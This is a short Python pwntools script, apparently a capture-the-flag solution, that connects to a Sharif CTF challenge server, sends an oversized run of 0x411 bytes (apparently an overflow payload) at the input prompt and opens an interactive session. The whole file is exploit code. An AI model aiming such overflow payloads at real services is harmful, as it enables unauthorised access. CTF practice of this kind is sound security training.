from pwn import *
r = remote('ctf.sharif.edu', 27515)
#r = remote('192.168.56.203', 27515)
print r.recvuntil('enter:')
r.sendline('\x01'*(0x411))
r.interactive()
